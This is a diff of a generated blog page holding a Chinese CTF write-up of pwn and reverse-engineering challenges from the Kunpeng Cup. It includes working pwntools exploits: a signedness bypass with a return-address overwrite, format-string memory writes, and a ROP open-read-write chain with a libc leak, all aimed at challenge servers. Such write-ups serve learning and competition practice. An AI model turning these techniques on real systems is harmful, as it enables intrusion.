@@ -33,16 +33,20 @@ var CONFIG = {
 window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">The Sun Also Rises</div><div class="header-banner-info__subtitle">飞基</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/04/25/kunpenbei/">鲲鹏杯个人wp</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-04-25</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-04-25</span></span></div></header><div class="post-body"><div class="post-excerpt">
         <h2 id="PWN"   >
           <a href="#PWN" class="heading-link"><i class="fas fa-link"></i></a><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2>
-      <p>signin_for_pwn1 @wulala11</p>
-<img src="/2023/04/25/kunpenbei/4.png" class="">
+      
+        <h2 id="signin-for-pwn1-wulala11"   >
+          <a href="#signin-for-pwn1-wulala11" class="heading-link"><i class="fas fa-link"></i></a><a href="#signin-for-pwn1-wulala11" class="headerlink" title="signin_for_pwn1 @wulala11"></a>signin_for_pwn1 @wulala11</h2>
+      <img src="/2023/04/25/kunpenbei/4.png" class="">
 <img src="/2023/04/25/kunpenbei/5.png" class="">
 <p>read(0, buf, v8);<br>通过这个可以跳转到gen_shell从而得到flag2<br>v5输入-1，可以绕过判断，并且在给unsigned __int8 v8赋值时，由于v8是无符号数，所以v8会是一个很大的数。<br>flag1直接输入3到8之内的数就可以得到。</p>
 <img src="/2023/04/25/kunpenbei/6.png" class="">
 <p>Exp:</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line">#io=process(&#x27;./bs&#x27;)</span><br><span class="line">io=remote(&#x27;43.143.224.232&#x27;,10001)</span><br><span class="line">sh=0x4006D7 #gen_shell函数地址</span><br><span class="line">payload=b&#x27;a&#x27;*13+p64(0)+p64(sh)</span><br><span class="line">io.sendline(str(-1))#第一个判断绕过</span><br><span class="line">io.sendline(payload)#利用read来跳转到gen_shell函数地址</span><br><span class="line">io.sendlineafter(&#x27;good!&#x27;,str(6))#第二个判断绕过</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
-<p>–<br>bs @wulala11</p>
-<hr>
-<img src="/2023/04/25/kunpenbei/7.png" class="">
+
+
+        <h2 id="bs-wulala11"   >
+          <a href="#bs-wulala11" class="heading-link"><i class="fas fa-link"></i></a><a href="#bs-wulala11" class="headerlink" title="bs @wulala11"></a>bs @wulala11</h2>
+      <img src="/2023/04/25/kunpenbei/7.png" class="">
 <p>格式化字符串漏洞改大数和小数。<br>用到了pwntools的一个工具fmtstr_payload，可以实现修改任意内存</p>
 <img src="/2023/04/25/kunpenbei/8.png" class="">
 <p>格式化字符串找出偏移是8</p>
@@ -51,9 +55,11 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></he
 <img src="/2023/04/25/kunpenbei/10.png" class="">
 <p>Exp:</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line">#io=process(&#x27;./bs&#x27;)</span><br><span class="line">io=remote(&#x27;43.143.224.232&#x27;,10000)</span><br><span class="line">offset=8#利用格式化字符串漏洞</span><br><span class="line">payload=fmtstr_payload(offset,&#123;0x601060:305419896&#125;)#0x601060为b的data段地址，发送这个payload可以来修改b的值</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload=fmtstr_payload(offset,&#123;0x601058:2&#125;)#0x601058为a的data段地址，发送这个payload可以来修改a的值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
-<p>–<br>Limited_sginup @wulala11</p>
-<hr>
-<p>未完成 ，写出来再修改吧（这句话好像有点熟悉，前面的都忘记补了，嗯。。。。）<br>格式化字符串找不到偏移。<br>开了59号沙箱，用orw方法。<br>Exp：</p>
+
+
+        <h2 id="Limited-sginup-wulala11"   >
+          <a href="#Limited-sginup-wulala11" class="heading-link"><i class="fas fa-link"></i></a><a href="#Limited-sginup-wulala11" class="headerlink" title="Limited_sginup @wulala11"></a>Limited_sginup @wulala11</h2>
+      <p>未完成 ，写出来再修改吧（这句话好像有点熟悉，前面的都忘记补了，嗯。。。。）<br>格式化字符串找不到偏移。<br>开了59号沙箱，用orw方法。<br>Exp：</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line">#io=process(&#x27;./limited_signup&#x27;)</span><br><span class="line">io=remote(&#x27;pwn.detectivelfy.top&#x27;,10009)</span><br><span class="line">libc=ELF(&#x27;libc-2.27.so&#x27;)</span><br><span class="line">bss=0x202160</span><br><span class="line">leave_ret=0x000c7d</span><br><span class="line">io.sendlineafter(&#x27;Your username: &#x27;,&#x27;%p%31$p&#x27;)</span><br><span class="line">io.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">stack=int(io.recv(12),16)</span><br><span class="line">io.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">libc_base=int(io.recv(12),16)-128-libc.symbols[&#x27;__libc_start_main&#x27;]</span><br><span class="line">log.info(hex(stack))</span><br><span class="line">log.info(hex(libc_base))</span><br><span class="line">openn=libc_base+libc.symbols[&#x27;open&#x27;]</span><br><span class="line">read=libc_base+libc.symbols[&#x27;read&#x27;]</span><br><span class="line">write=libc_base+libc.symbols[&#x27;write&#x27;]</span><br><span class="line">pop_rdi_ret=libc_base+0x000000000002164f</span><br><span class="line">pop_rsi_ret=libc_base+0x0000000000023a6a</span><br><span class="line">pop_rdx_ret=libc_base+0x0000000000001b96</span><br><span class="line">payload=p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(bss)+p64(pop_rdx_ret)+p64(0x100)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(bss)+p64(pop_rsi_ret)+p64(0)+p64(openn)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(bss+0x10)+p64(pop_rdx_ret)+p64(0x100)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(1)+p64(write)</span><br><span class="line">payload+=b&#x27;\0&#x27;*(192-len(payload))</span><br><span class="line">payload+=p64(stack+8)+p64(leave_ret)</span><br><span class="line">io.sendlineafter(&#x27;password(0-8 chars): &#x27;,payload)</span><br><span class="line">io.send(&#x27;./flag\x00&#x27;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
 
 
@@ -90,9 +96,11 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></he
 <p>Exp:</p>
 <img src="/2023/04/25/kunpenbei/20.png" class="">
 <img src="/2023/04/25/kunpenbei/21.png" class="">
-<p>记得加上’}’。<br>do some shop @wulala11</p>
-<hr>
-<p>是pyd后缀的文件，没见过，长见识了。<br>运行后，发现是一个运气（dubo）游戏,赚到10000块能买flag。<br>拿到10000块后发现买到的flag是假的。</p>
+<p>记得加上’}’。</p>
+
+        <h2 id="do-some-shop-wulala11"   >
+          <a href="#do-some-shop-wulala11" class="heading-link"><i class="fas fa-link"></i></a><a href="#do-some-shop-wulala11" class="headerlink" title="do some shop @wulala11"></a>do some shop @wulala11</h2>
+      <p>是pyd后缀的文件，没见过，长见识了。<br>运行后，发现是一个运气（dubo）游戏,赚到10000块能买flag。<br>拿到10000块后发现买到的flag是假的。</p>
 <img src="/2023/04/25/kunpenbei/22.png" class="">
 <p>只能找别的方法了。<br>这个指令可以查看pyd文件可调用的函数。</p>
 <img src="/2023/04/25/kunpenbei/23.png" class="">
